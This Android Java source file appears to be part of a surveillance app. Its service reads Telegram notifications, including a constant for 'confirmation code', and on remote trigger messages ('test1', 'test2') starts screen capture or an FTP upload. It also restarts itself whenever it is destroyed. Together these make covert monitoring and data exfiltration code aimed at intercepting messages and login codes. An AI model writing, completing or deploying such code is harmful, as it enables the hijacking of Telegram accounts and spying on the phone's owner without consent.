package com.example.twatcher;

import android.app.Notification;
import android.content.Intent;
import android.os.IBinder;
import android.service.notification.NotificationListenerService;
import android.service.notification.StatusBarNotification;
import android.util.Log;
import java.util.Timer;
import java.util.TimerTask;

public class AutoStartService extends NotificationListenerService {

    private static final String TAG = "TEST: ";
    private static final String NEEDED_APP_PACKAGE = "org.telegram.messenger";
    private static final String NEEDED_APP_NOTIFICATION_TITLE = "Telegram";
    private static final String NEEDED_APP_NOTIFICATION_TITLE_TESTING = "Nikita Lukanin";
    private static final String NEEDED_APP_NOTIFICATION_MESSAGE = "Код подтверждения";
    public int counter = 0;
    private Timer timer;

    public AutoStartService() {
        Log.i(TAG, "AutoStartService constructor");
    }

    @Override
    public IBinder onBind(Intent intent) {
        Log.i(TAG, "AutoStartService onBind");
        Log.i(TAG, "AutoStartService intent"+intent.getAction());

        //return new RecordBinder();

        startTimer();

        return super.onBind(intent);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.i(TAG, "AutoStartService onStartCommand");

        super.onStartCommand(intent, flags, startId);

        startTimer();
        return START_STICKY;
    }

    @Override
    public void onCreate() {
        Log.i(TAG, "AutoStartService onCreate");
        super.onCreate();
    }

    public void startTimer() {
        if (timer != null) {
            timer.cancel();
        }

        timer = new Timer();
        TimerTask timerTask = new TimerTask() {
            @Override
            public void run() {
                Log.i(TAG, "Timer is running " + counter++);
                if(App.getDelayCounter() > 0) {
                    Log.i(TAG, "getDelayCounter: " + App.getDelayCounter());

                    App.minusDelayCounter();

                    Intent dialogIntent = new Intent(App.getAppContext(), ScreenCaptureActivity.class);
                    dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    App.getAppContext().startActivity(dialogIntent);
                }
            }
        };

        timer.schedule(timerTask, 1000, 1000);
    }

    public void stoptimertask() {
        if (timer != null) {
            timer.cancel();
            timer = null;
        }
    }

    @Override
    public void onNotificationPosted(StatusBarNotification sbn){
        String notificationApp = sbn.getPackageName();

        Log.i(TAG, "onNotificationPosted: " + notificationApp);

        if(notificationApp != null)
        {
            if(notificationApp.equals(NEEDED_APP_PACKAGE)) {
                String notificationTitle = sbn.getNotification().extras.getCharSequence(Notification.EXTRA_TITLE).toString();
                String notificationText = sbn.getNotification().extras.getCharSequence(Notification.EXTRA_TEXT).toString();

                Log.i(TAG, "IS NEEDED1: "+notificationTitle);
                Log.i(TAG, "IS NEEDED2: "+notificationText);

                if(notificationTitle != null && notificationText != null && notificationTitle.equals(NEEDED_APP_NOTIFICATION_TITLE_TESTING)) {
                    //Log.i(TAG, "onNotificationPosted: " + sbn.getNotification().extras.getCharSequence(Notification.EXTRA_TEXT).toString());
                    //Log.i(TAG, "onNotificationPosted: " + sbn.getNotification().extras.getCharSequence(Notification.EXTRA_TITLE).toString());

                    if(notificationText.equals("test1")) {
                        /*App.setDelayCounter(3);

                        Intent dialogIntent = new Intent(App.getAppContext(), ScreenCaptureActivity.class);
                        dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        App.getAppContext().startActivity(dialogIntent);*/

                        Intent dialogIntent = new Intent(App.getAppContext(), ScreenCaptureActivity.class);
                        dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        App.getAppContext().startActivity(dialogIntent);
                    }
                    else {
                        if(notificationText.equals("test2")) {
                            FTPFileUpload catTask = new FTPFileUpload();
                            catTask.execute();
                        }
                    }
                }

            /*if(notificationTitle != null && notificationText != null &&
                    notificationTitle.equals(NEEDED_APP_NOTIFICATION_TITLE)) {
                Log.i(TAG, "onNotificationPosted: " + sbn.getNotification().extras.getCharSequence(Notification.EXTRA_TEXT).toString());
                Log.i(TAG, "onNotificationPosted: " + sbn.getNotification().extras.getCharSequence(Notification.EXTRA_TITLE).toString());

                Intent dialogIntent = new Intent(this, ScreenRecordingAcitivity.class);
                dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(dialogIntent);
            }*/
            }
        }
    }

    @Override
    public void onNotificationRemoved(StatusBarNotification sbn){
        //Log.i(TAG, "onNotificationRemoved: " + sbn.getTag());
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.i(TAG, "onDestroy: Service is destroyed :( ");
        Intent broadcastIntent = new Intent(this, RestartBroadcastReceiver.class);

        sendBroadcast(broadcastIntent);
        stoptimertask();
    }
}